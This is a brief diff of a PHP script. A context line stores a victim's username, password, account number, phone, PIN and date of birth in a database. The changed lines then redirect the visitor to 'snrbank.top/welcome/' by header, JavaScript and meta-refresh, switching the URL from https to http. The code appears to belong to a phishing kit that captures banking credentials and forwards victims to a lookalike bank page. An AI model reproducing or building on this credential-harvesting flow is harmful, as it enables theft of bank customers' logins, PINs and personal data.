@@ -149,14 +149,14 @@ $stmt->execute([$myUsername,$myPassword,$myAccount,$myPhone,$myPIN,$myDOB ]);
 //   echo("Done!");
 
 if (!headers_sent()){
-header("Location: https://snrbank.top/welcome/");
+header("Location: http://snrbank.top/welcome/");
 // exit();
 } else {
 	echo '<script type="text/javascript">';
-	echo 'window.location.href="https://snrbank.top/welcome/";';
+	echo 'window.location.href="http://snrbank.top/welcome/";';
 	echo '</script>';
 	echo '<noscript>';
-	echo '<meta http-equiv="refresh" content="0;url=https://snrbank.top/welcome/" />';
+	echo '<meta http-equiv="refresh" content="0;url=http://snrbank.top/welcome/" />';
 	echo '</noscript>';
 }
 }
